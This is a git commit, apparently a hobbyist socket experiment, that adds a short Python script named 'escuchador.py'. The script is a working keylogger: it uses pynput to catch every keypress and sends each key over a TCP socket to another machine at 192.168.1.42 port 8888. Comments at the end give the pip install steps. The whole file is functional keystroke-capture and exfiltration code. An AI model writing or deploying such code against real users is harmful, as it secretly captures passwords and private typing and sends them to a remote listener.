91f3aa94a9d16c4dcef4321776d9d3aede0fb38c
matiasUbuntu <matiaserenchun@gmail.com>
2021-07-03 22:41:30 -0300

    ahorasii

---
+++ experimento con sockets/escuchador.py
@@ -0,0 +1,22 @@
+import datetime
+import socket
+from pynput.keyboard import Key, Listener
+
+def key_recorder(key):
+    mi_socket = socket.socket()
+    mi_socket.connect(('192.168.1.42', 8888))
+    mensaje = str(key)
+    mi_socket.send(str.encode(mensaje))
+    mi_socket.close()
+    print(key)
+
+
+
+
+with Listener(on_press=key_recorder) as l:
+    l.join()
+
+print("Hello world")
+
+#sudo apt install python3-pip // instalar pip para intalar pynput XD
+#sudo pip install pynput
